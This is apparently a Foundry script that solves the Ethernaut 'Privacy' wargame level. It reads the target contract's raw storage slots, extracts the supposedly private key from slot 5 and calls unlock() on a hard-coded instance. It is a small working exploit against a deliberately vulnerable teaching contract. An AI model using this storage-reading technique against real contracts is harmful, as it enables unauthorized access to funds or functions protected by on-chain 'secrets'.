// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../src/Privacy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "forge-std/StdStorage.sol";

contract Level12PrivacySolution is Script {
    using stdStorage for StdStorage;

    bytes32 public key;

    Privacy public instance = Privacy(0xB44c0026cEc32649652C1f4b8655C2773dDcCD68);

    function run() external {
        for (uint256 i; i <= 5; ++i) {
            console.logBytes32(vm.load(address(instance), bytes32(i)));
            if (i == 5) {
                key = vm.load(address(instance), bytes32(i));
            }
        }
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        instance.unlock(bytes16(key));
        console.log("result: ", instance.locked());

        vm.stopBroadcast();
    }
}
